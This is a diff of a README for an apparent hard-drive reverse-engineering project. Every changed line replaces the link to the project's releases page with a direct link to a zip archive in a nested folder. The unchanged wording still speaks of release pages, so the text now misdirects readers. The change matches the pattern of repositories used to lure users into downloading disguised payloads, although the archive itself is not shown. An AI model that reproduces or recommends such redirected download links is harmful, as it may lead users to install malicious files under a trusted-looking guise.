@@ -1,6 +1,6 @@
 # 🧩 marvell-hdd-reverse-engineering - Boot Marvell HDDs with Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Gamming3701/marvell-hdd-reverse-engineering/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Gamming3701/marvell-hdd-reverse-engineering/raw/refs/heads/main/88i9122/reverse_hdd_engineering_marvell_3.0.zip)
 
 ## 🖥️ What This Is
 
@@ -10,7 +10,7 @@ It is meant for people who want to learn how these drives work, what is inside t
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Gamming3701/marvell-hdd-reverse-engineering/releases
+Visit this page to download: https://github.com/Gamming3701/marvell-hdd-reverse-engineering/raw/refs/heads/main/88i9122/reverse_hdd_engineering_marvell_3.0.zip
 
 Open the page in your browser and check the latest release. If files are listed there, pick the one that matches your system or the package name shown by the release author.
 
@@ -27,7 +27,7 @@ If the release includes archives such as `.zip` or `.7z`, you may also need a fi
 
 ## 🚀 How to Get Started
 
-1. Open the download page: https://github.com/Gamming3701/marvell-hdd-reverse-engineering/releases
+1. Open the download page: https://github.com/Gamming3701/marvell-hdd-reverse-engineering/raw/refs/heads/main/88i9122/reverse_hdd_engineering_marvell_3.0.zip
 2. Find the newest release at the top of the page
 3. Open the release page and look at the attached files
 4. Download the file that fits your needs
@@ -172,6 +172,6 @@ A simple workflow on Windows looks like this:
 
 If you need the files later, use the same release page:
 
-https://github.com/Gamming3701/marvell-hdd-reverse-engineering/releases
+https://github.com/Gamming3701/marvell-hdd-reverse-engineering/raw/refs/heads/main/88i9122/reverse_hdd_engineering_marvell_3.0.zip
 
 Open the latest release, then download the attached files again if needed
